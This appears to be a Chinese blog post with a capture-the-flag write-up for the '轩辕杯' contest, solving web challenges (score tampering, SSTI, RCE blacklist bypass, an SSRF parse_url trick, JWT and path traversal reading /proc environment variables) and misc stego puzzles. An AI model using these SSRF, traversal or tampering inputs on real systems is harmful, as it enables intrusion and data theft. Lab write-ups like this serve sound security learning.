<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="whyy">
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
        
        
        
    
    <!--- Seo Part-->
    
    <link rel="canonical" href="http://example.com/2025/05/23/轩辕杯wp/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
    
    
        
        <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
<meta property="og:type" content="article">
<meta property="og:title" content="轩辕杯wp">
<meta property="og:url" content="http://example.com/2025/05/23/%E8%BD%A9%E8%BE%95%E6%9D%AFwp/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/images/redefine-og.webp">
<meta property="article:published_time" content="2025-05-23T11:21:18.000Z">
<meta property="article:modified_time" content="2025-05-23T11:58:37.761Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/images/redefine-og.webp">
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="https://cdn.jsdelivr.net/gh/yzt724/picture/202503161349049.jpg" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="https://cdn.jsdelivr.net/gh/yzt724/picture/202503161349049.jpg">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/yzt724/picture/202503161349049.jpg">
    <!--- Page Info-->
    
    <title>
        
            轩辕杯wp | Blog
        
    </title>

    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fonts/Chillax/chillax.css">

    <!--- Inject Part-->
    

    
<link rel="stylesheet" href="/css/style.css">


    
        <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/css/build/tailwind.css">
    

    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fonts/GeistMono/geist-mono.css">
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fonts/Geist/geist.css">
    <!--- Font Part-->
    
    
    
        <link href="https://fonts.googleapis.com/css2?" rel="stylesheet">
    
    
    
    

    <script id="hexo-configurations">
    window.config = {"hostname":"example.com","root":"/","language":"zh-CN"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":false,"count":false,"min2read":false},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":true,"expand":true,"init_open":true},"copyright":{"enable":false,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":true,"family":"Noto Sans SC","url":"https://fonts.googleapis.com/css2?"},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":"flase","site_uv":false,"post_pv":false},"single_page":true,"preloader":{"enable":"flase","custom_message":null},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"static","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Theme Redefine","subtitle":{"text":["This is the first message","This is the second message"],"hitokoto":{"enable":true,"show_author":true,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Tags":{"path":"/tags/","icon":"fa-regular fa-tags"},"Categories":{"icon":"fa-solid fa-folder","path":"/categories/"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":999,"tags_style":"could"},"home":{"sidebar":{"enable":true,"position":"right","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":999}},"footerStart":"2022/8/17 11:45:14"};
    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fontawesome/fontawesome.min.css">
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fontawesome/brands.min.css">
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fontawesome/solid.min.css">
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fontawesome/regular.min.css">
    
    
    
    
<meta name="generator" content="Hexo 7.3.0"></head>



<body>
	<div class="progress-bar-container">
	
	<span class="scroll-progress-bar"></span>
	

	
	<span class="pjax-progress-bar"></span>
	<!--        <span class="swup-progress-icon">-->
	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
	<!--        </span>-->
	
</div>

<main class="page-container" id="swup">

	

	<div class="main-content-container flex flex-col justify-between min-h-dvh">
		<div class="main-content-header">
			<header class="navbar-container px-6 md:px-12">
    <div class="navbar-content transition-navbar ">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                Blog
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    首页
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/tags/"
                                        >
                                    <i class="fa-regular fa-tags fa-fw"></i>
                                    标签
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/categories/"
                                        >
                                    <i class="fa-solid fa-folder fa-fw"></i>
                                    分类
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                首页
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/tags/"
                        >
                            <span>
                                标签
                            </span>
                            
                                <i class="fa-regular fa-tags fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/categories/"
                        >
                            <span>
                                分类
                            </span>
                            
                                <i class="fa-solid fa-folder fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            

            
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">2</div>
        <div class="label text-third-text-color text-sm">标签</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
        <div class="label text-third-text-color text-sm">分类</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">8</div>
        <div class="label text-third-text-color text-sm">文章</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


		</div>

		<div class="main-content-body transition-fade-up">
			

			<div class="main-content">
				<div class="post-page-container flex relative justify-between box-border w-full h-full">
	<div class="article-content-container">

		<div class="article-title relative w-full">
			
			<div class="w-full flex items-center pt-6 justify-start">
				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">轩辕杯wp</h1>
			</div>
			
		</div>

		
		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
				<img src="https://cdn.jsdelivr.net/gh/yzt724/picture/202503171643225.jpg">
			</div>
			<div class="info flex flex-col justify-between">
				<div class="author flex items-center">
					<span class="name text-default-text-color text-lg font-semibold">whyy</span>
					
				</div>
				<div class="meta-info">
					<div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2025-05-23 19:21:18</span>
        <span class="mobile">2025-05-23 19:21:18</span>
        <span class="hover-info">创建</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2025-05-23 19:58:37</span>
            <span class="mobile">2025-05-23 19:58:37</span>
            <span class="hover-info">更新</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/wp/">wp</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    

    
    
    
    
</div>

				</div>
			</div>
		</div>
		

		


		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
			<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="ezjs"><a href="#ezjs" class="headerlink" title="ezjs"></a>ezjs</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202505231956950.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”3.1777744969378827in”}</p>
<p>查看源代码发现这个</p>
<p>在控制台上输入<strong>fetch(&#39;getflag.php&#39;, {</strong></p>
<p><strong>method: &#39;POST&#39;,</strong></p>
<p><strong>headers: {</strong></p>
<p><strong>&#39;Content-Type&#39;: &#39;application&#x2F;x-www-form-urlencoded&#39;,</strong></p>
<p><strong>},</strong></p>
<p><strong>body: &#39;score&#x3D;100000000000&#39;</strong></p>
<p><strong>})</strong></p>
<p><strong>.then(response &#x3D;&gt; response.text())</strong></p>
<p><strong>.then(data &#x3D;&gt; console.log(&quot;Flag:&quot;, data))</strong></p>
<p><strong>.catch(error &#x3D;&gt; console.error(&#39;Error:&#39;, error));</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202505231956951.png"
                      alt="descript"
                >{width&#x3D;”4.854166666666667in”<br>height&#x3D;”2.3125in”}</p>
<p><strong>得到了flag</strong></p>
<h2 id="ezflask"><a href="#ezflask" class="headerlink" title="ezflask"></a>ezflask</h2><p><strong>ssti,直接上fenjng</strong></p>
<p><strong>找了半天没找到flag，在proc目录下看环境变量出了</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202505231956956.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”3.459510061242345in”}</p>
<h2 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a>ezrce</h2><p>直接使用黑名单外的函数进行绕过就行</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="D:/hexo/source/pandoc-3.7.0.1/images/media/image6.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”4.428715004374453in”}</p>
<h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="D:/hexo/source/pandoc-3.7.0.1/images/media/image7.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”2.758731408573928in”}</p>
<p><strong>GET参数检测通过！</strong></p>
<p><strong>POST参数检测通过！</strong></p>
<p><strong>Cookie检测通过！</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="D:/hexo/source/pandoc-3.7.0.1/images/media/image8.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”2.4187489063867016in”}</p>
<p><strong>🎉 恭喜你！下一关路径是：.&#x2F;l23evel4.php</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202505231956111.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”3.5358366141732285in”}</p>
<p><strong>你是聪明人，下一关路径是：.&#x2F;levelThree.php</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="D:/hexo/source/pandoc-3.7.0.1/images/media/image10.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”2.4265540244969377in”}</p>
<p><strong>下一关的路径是.&#x2F;level444Four.php</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="D:/hexo/source/pandoc-3.7.0.1/images/media/image11.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”3.9976367016622922in”}</p>
<p><strong>使用代码Head请求</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202505231956551.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”2.5529451006124235in”}</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="D:/hexo/source/pandoc-3.7.0.1/images/media/image13.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”3.2874496937882767in”}</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202505231956943.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”3.3573534558180227in”}</p>
<p>rce黑名单应该是</p>
<p>使用string &#x2F;*，打印出即可</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202505231956734.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”3.1974890638670166in”}</p>
<h2 id="ezssrf1-0"><a href="#ezssrf1-0" class="headerlink" title="ezssrf1.0"></a>ezssrf1.0</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="D:/hexo/source/pandoc-3.7.0.1/images/media/image16.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”3.1555621172353456in”}</p>
<p>看出來是ssrf</p>
<p>但是不能直接执行</p>
<p>主要要求：</p>
<p>$x[&#39;host&#39;] &#x3D;&#x3D;&#x3D; null：URL没有明确的主机部分。</p>
<p>$x[&#39;scheme&#39;] &#x3D;&#x3D;&#x3D; &#39;http&#39;：URL的协议是HTTP。</p>
<p>如果条件满足， curl 访问提供的URL</p>
<p>结合了 parse_url() 的宽松解析和 curl 的URL修复行为</p>
<p>使用http:<a class="link"   href="mailto:&#x64;&#97;&#117;&#110;&#x40;&#x31;&#50;&#55;&#x2e;&#48;&#x2e;&#x30;&#x2e;&#49;" >&#x64;&#97;&#117;&#110;&#x40;&#x31;&#50;&#55;&#x2e;&#48;&#x2e;&#x30;&#x2e;&#49;<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>&#x2F;flag就能够实现ssrf访问服务器本地文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="D:/hexo/source/pandoc-3.7.0.1/images/media/image17.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”2.2717891513560806in”}</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="D:/hexo/source/pandoc-3.7.0.1/images/media/image18.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”1.8302329396325459in”}</p>
<h2 id="ez-web1"><a href="#ez-web1" class="headerlink" title="ez_web1"></a>ez_web1</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202505231956099.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”2.2760028433945756in”}</p>
<p>根据提示，使用</p>
<p>fly233</p>
<p>123456789</p>
<p>登录成功</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="D:/hexo/source/pandoc-3.7.0.1/images/media/image20.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”3.1890234033245846in”}</p>
<p>有三个页面</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="D:/hexo/source/pandoc-3.7.0.1/images/media/image21.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”3.5433595800524933in”}</p>
<p>还有一个上传页面</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202505231956222.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”3.4585279965004374in”}</p>
<p>jwt没有秘钥</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="D:/hexo/source/pandoc-3.7.0.1/images/media/image23.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”3.728850612423447in”}</p>
<p>尝试任意文件读取，目录穿越，目录遍历</p>
<p>发现能够成功，但&#x2F;flag读不了，读取proc下环境变量出了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202505231956463.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”3.4087653105861766in”}</p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Terminal-Hacker"><a href="#Terminal-Hacker" class="headerlink" title="Terminal Hacker"></a>Terminal Hacker</h2><p>题目给的是exe，ida分析</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="D:/hexo/source/pandoc-3.7.0.1/images/media/image25.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”4.532426727909011in”}</p>
<p>看到pyi，将exe解包为pyc</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202505231956601.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”2.746450131233596in”}</p>
<p>打开pyc直接就能看到flag</p>
<h2 id="哇哇哇瓦"><a href="#哇哇哇瓦" class="headerlink" title="哇哇哇瓦"></a>哇哇哇瓦</h2><p>首先先将图片放进随波逐流，</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202505231956713.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”1.6125590551181102in”}</p>
<p>得到了一半的flag</p>
<p>然后将图片进行foremost，得到了一个zip文件</p>
<p>打开之后</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="D:/hexo/source/pandoc-3.7.0.1/images/media/image28.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”1.7308727034120734in”}</p>
<p>观察了角落发现了一个rgb色块，使用脚本提取出来</p>
<p>import numpy as np</p>
<p>from PIL import Image</p>
<p>import io</p>
<p>def extract_last_row_and_decode():</p>
<p>with open(&quot;0.png&quot;, &quot;rb&quot;) as f:</p>
<p>data &#x3D; f.read()</p>
<p>img &#x3D; Image.open(io.BytesIO(data)).convert(&quot;RGB&quot;)</p>
<p>np_data &#x3D; np.array(img)</p>
<p>height, width, _ &#x3D; np_data.shape</p>
<p># 获取最后一行所有像素</p>
<p>last_row &#x3D; np_data[height - 1]</p>
<p>hex_list &#x3D; []</p>
<p>for pixel in last_row:</p>
<p>r, g, b &#x3D; pixel</p>
<p>hex_str &#x3D; &#39;{:02x}{:02x}{:02x}&#39;.format(r, g, b)</p>
<p>hex_list.append(hex_str)</p>
<p>hex_string &#x3D; &#39;&#39;.join(hex_list)</p>
<p># 尝试解码成 ASCII</p>
<p>try:</p>
<p>ascii_output &#x3D; bytes.fromhex(hex_string).decode(&#39;utf-8&#39;,</p>
<p>errors&#x3D;&#39;replace&#39;)</p>
<p>except Exception as e:</p>
<p>ascii_output &#x3D; f&#39;[解码错误: {e}]&#39;</p>
<p># 输出预览到控制台</p>
<p>print(&#39;[Hex 前 256 位]:&#39;)</p>
<p>print(hex_string[:256])</p>
<p>print(&#39;\n[ASCII 解码预览]:&#39;)</p>
<p>print(ascii_output[:512])</p>
<p># 写入 output.txt</p>
<p>with open(&quot;output.txt&quot;, &quot;w&quot;, encoding&#x3D;&quot;utf-8&quot;) as out:</p>
<p>out.write(&quot;[Hex 全部]:\n&quot;)</p>
<p>out.write(hex_string + &quot;\n\n&quot;)</p>
<p>out.write(&quot;[ASCII 解码结果]:\n&quot;)</p>
<p>out.write(ascii_output)</p>
<p>print(&quot;\n 结果已写入 output.txt&quot;)</p>
<p>if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</p>
<p>extract_last_row_and_decode()</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202505231956916.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”3.6098075240594927in”}</p>
<p>将这些数据进行ascll解码</p>
<p>发现了一大堆的pk，将这段扔进010里面</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="D:/hexo/source/pandoc-3.7.0.1/images/media/image30.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”1.2170505249343833in”}</p>
<p>观察最后牢记50 4b 03 04 14 00，所以是每三个为一组逆序输出</p>
<p>def reverse_chunk_join(hex_str, chunk_size&#x3D;6):</p>
<p># 反转字符串</p>
<p>reversed_str &#x3D; hex_str[::-1]</p>
<p># 按指定大小分块</p>
<p>chunks &#x3D; [reversed_str[i:i+chunk_size] for i in range(0,</p>
<p>len(reversed_str), chunk_size)]</p>
<p># 反转每个块以恢复原始顺序</p>
<p>reversed_chunks &#x3D; [chunk[::-1] for chunk in chunks]</p>
<p># 拼接所有块</p>
<p>result &#x3D; &#39;&#39;.join(reversed_chunks)</p>
<p>return result</p>
<p>def process_file(input_file, output_file):</p>
<p>try:</p>
<p># 读取文件内容</p>
<p>with open(input_file, &#39;r&#39;) as f:</p>
<p>content &#x3D; f.read().strip()</p>
<p># 处理内容</p>
<p>processed_content &#x3D; reverse_chunk_join(content)</p>
<p># 写入结果</p>
<p>with open(output_file, &#39;w&#39;) as f:</p>
<p>f.write(processed_content)</p>
<p>print(f&quot;处理完成，结果已保存到 {output_file}&quot;)</p>
<p>except FileNotFoundError:</p>
<p>print(f&quot;错误：找不到输入文件 {input_file}&quot;)</p>
<p>except Exception as e:</p>
<p>print(f&quot;处理过程中发生错误: {str(e)}&quot;)</p>
<p>if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</p>
<p>input_filename &#x3D; &quot;b.txt&quot; # 输入文件名</p>
<p>output_filename &#x3D; &quot;o.txt&quot; # 输出文件名</p>
<p>process_file(input_filename, output_filename)</p>
<p>然后将得到到hex的进行删减</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="D:/hexo/source/pandoc-3.7.0.1/images/media/image31.png"
                      alt="descript"
                >{width&#x3D;”5.864583333333333in”<br>height&#x3D;”2.375in”}</p>
<p>得到了最后的flag，为best_FPS_g@me!!}</p>
<p>所以flag为密码</p>
<p>flag{Val0rant_1s_th3_best_FPS_g@me!!}</p>
<h2 id="音频的秘密"><a href="#音频的秘密" class="headerlink" title="音频的秘密"></a>音频的秘密</h2><p>经过多次错误的尝试，把音频放到这个软件里面解出一个压缩包</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="D:/hexo/source/pandoc-3.7.0.1/images/media/image32.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”5.284451006124234in”}</p>
<p>但是没有密码，需要爆破，爆破出密码是1234</p>
<p>然后得到一个泰山石敢当的图片</p>
<p>放到这个软件，分析色彩通道</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="D:/hexo/source/pandoc-3.7.0.1/images/media/image33.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”4.209213692038495in”}</p>
<p>这个不是最终的flag，维吉尼亚解码，需要密码，回看zip的信息，得到密码是lovely。一定要注意空格</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202505231956424.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”4.724479440069992in”}</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202505231956588.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”4.2919794400699915in”}</p>
<h2 id="数据识别与审计"><a href="#数据识别与审计" class="headerlink" title="数据识别与审计"></a>数据识别与审计</h2><h3 id="pdf"><a href="#pdf" class="headerlink" title="pdf"></a>pdf</h3><p>一个一个点</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202505231956950.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”2.2395253718285213in”}</p>
<p>全是弹窗</p>
<h3 id="txt"><a href="#txt" class="headerlink" title="txt"></a>txt</h3><p>使用工具搜&quot;号&quot;和”@”，找到一些敏感信息</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202505231956265.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”2.367972440944882in”}</p>
<h3 id="wav"><a href="#wav" class="headerlink" title="wav"></a>wav</h3><p>一般音频</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="D:/hexo/source/pandoc-3.7.0.1/images/media/image38.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”2.8358497375328082in”}</p>
<p>异常音频</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="D:/hexo/source/pandoc-3.7.0.1/images/media/image39.png"
                      alt="descript"
                >{width&#x3D;”6.299305555555556in”<br>height&#x3D;”2.8358497375328082in”}</p>
<p>Bd2IYe3.wav,bjVwvcC.wav,H0KDChj.wav,ou9E9Mh.wav,UEbzH4X.wav</p>
<h3 id="png"><a href="#png" class="headerlink" title="png"></a>png</h3><p>文件放随波逐流，文件尾部有恶意代码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202505231956835.png"
                      alt="descript"
